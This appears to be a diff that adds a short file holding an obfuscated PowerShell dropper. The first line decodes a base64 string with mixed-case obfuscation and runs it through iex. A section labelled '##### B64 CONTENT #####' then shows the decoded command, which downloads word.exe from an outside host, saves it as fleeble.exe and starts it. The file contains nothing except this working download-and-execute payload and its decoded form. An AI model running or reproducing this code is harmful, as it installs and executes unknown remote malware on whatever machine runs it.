@@ -1,0 +1,7 @@
+iex([SYsTEM.tExT.eNCodING]::uTf8.gEtSTring([syStEM.ConVeRT]::FrOmBase64StrIng('CihOZXctT2JqZWN0IHN5U1RFTS5uRVQud0ViQ2xpRU5UKS5kb3dubG9hZGZJbEUoJ2h0dHA6Ly9kYXJhdGFkLjVnYmZyZWUuY29tL3VzZXMvd29yZC5leGUnLCdmbGVlYmxlLmV4ZScpO1N0YXJ0LVByb2Nlc3MgJ2ZsZWVibGUuZXhlJwoK')));exit
+
+##### B64 CONTENT #####
+
+
+(New-Object sySTEM.nET.wEbCliENT).downloadfIlE('http://daratad.5gbfree.com/uses/word.exe','fleeble.exe');Start-Process 'fleeble.exe'
+
